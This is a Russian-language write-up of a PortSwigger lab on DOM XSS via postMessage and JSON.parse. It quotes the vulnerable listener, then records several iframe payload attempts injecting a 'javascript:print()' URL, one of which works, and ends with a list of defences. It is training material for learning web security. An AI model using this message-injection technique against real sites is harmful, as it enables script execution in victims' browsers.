лаба https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse

#### DOM XSS using web messages and `JSON.parse`
лаборатория использует веб-обмен сообщениями и анализирует сообщение в формате JSON

задание, вызвать принт через js

-----

на главной стр (GET / HTTP/2) сразу вижу в html коде вот это:

это функционал, который слушает веб-сообщения через iframe / appendChild
т здесь есть парсинг JSON.parse(e.data)

```html

<script>

                        window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);
                        
</script>

```
кейс `"load-channel"` создает iframe и вставляет в него `src` из присланного JSON. Если мы сможем передать `javascript:` URL

настраиваю пейлоад под "load-channel" 

пробую:
```html


<iframe src="https://0aee00fb034a6ab580260305006700f6.web-security-academy.net/" onload="this.contentWindow.postMessage('{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}', '*')">
```
принта нет

вот ответ от сервера
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Server: Academy Exploit Server
Content-Length: 188

<iframe src="https://0aee00fb034a6ab580260305006700f6.web-security-academy.net/" onload="this.contentWindow.postMessage('{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}', '*')">
```

------

пробую с задержкой

```http
<iframe src="https://0aee00fb034a6ab580260305006700f6.web-security-academy.net/" onload="setTimeout(() => this.contentWindow.postMessage('{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}', '*'), 500)">
```

не работает

------

пробую другие кавычки
```html
<iframe src="https://0aee00fb034a6ab580260305006700f6.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

сработало

принт есть

Отправил Exploit жертвы и равно лаба решена!!

------

#### выводы

была уязвимость в обработчике веб-сообщений для выполнения DOM XSS

На странице был код, который слушал сообщения через `postMessage`, парсил их через `JSON.parse()`, и в зависимости от поля `type`выполнял разные действия

например, в  кейсе `load-channel` значение поля `url`присваивалось атрибуту `src` создаваемого iframe (=- ACMEplayer.element.src = d.url; -=) 

Я создал на эксплойт-сервере iframe, загружающий целевую страницу

После загрузки через `postMessage` отправил JSON-строку с типом `load-channel` и URL `javascript:print()`  (которую как раз парсит функция. та что я нашел)

Из-за отсутствия проверки происхождения сообщения (параметр `'*'`) и валидации URL обработчик вставил `javascript:print()` в `src`нового iframe, что привело к выполнению `print()` в контексте страницы.

Критически важным оказалось правильное экранирование кавычек в JSON, чтобы браузер корректно обработал сообщение

#### защита

1
при использовании `postMessage` всегда нужно проверять происхождение сообщения через `e.origin` и сравнивать с белым списком доверенных доменов

2
 перед парсингом JSON валидировать структуру данных и типы полей
 
 3
запрещать использование `javascript:` схемы в URL, особенно при установке `src` для iframe или редиректах

4
применять строгие Content Security Policy, блокирующие выполнение инлайн-скриптов

5
не использовать конструкцию `'*'` в `postMessage` без крайней необходимости





